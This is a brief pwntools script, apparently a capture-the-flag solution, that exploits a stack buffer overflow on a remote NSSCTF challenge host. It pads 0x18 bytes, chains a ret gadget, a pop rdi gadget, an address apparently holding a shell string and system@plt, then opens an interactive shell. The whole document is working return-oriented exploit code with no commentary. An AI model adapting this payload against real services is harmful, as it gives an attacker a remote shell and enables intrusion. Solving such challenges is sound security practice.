from pwn import *

# gadget

p = remote("node4.anna.nssctf.cn",28941)

pop_rdi = 0x00000000004005e3
back = 0x400541
system_plt = 0x400430
ret = pop_rdi + 1 

payload = b"a" *0x18 + p64(ret) + p64(pop_rdi) + p64(back) + p64(system_plt) 

p.sendline(payload)

p.interactive()